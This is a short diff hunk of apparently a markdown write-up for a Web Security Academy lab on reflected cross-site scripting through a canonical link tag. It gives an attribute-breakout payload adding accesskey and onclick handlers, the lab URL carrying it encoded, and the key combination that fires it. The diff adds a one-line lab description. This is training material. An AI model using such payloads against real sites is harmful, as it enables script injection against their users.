@@ -17,3 +17,4 @@ the payload: `?'accesskey='x'onclick='alert(1)`
 url: `https://0ac5000c03c6cce280550d91009a00ce.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)`\
 run this exploit by using CTRL+SHIFT+X in the browser.
 
+!!! `This lab reflects user input in a canonical link tag and escapes angle brackets. `
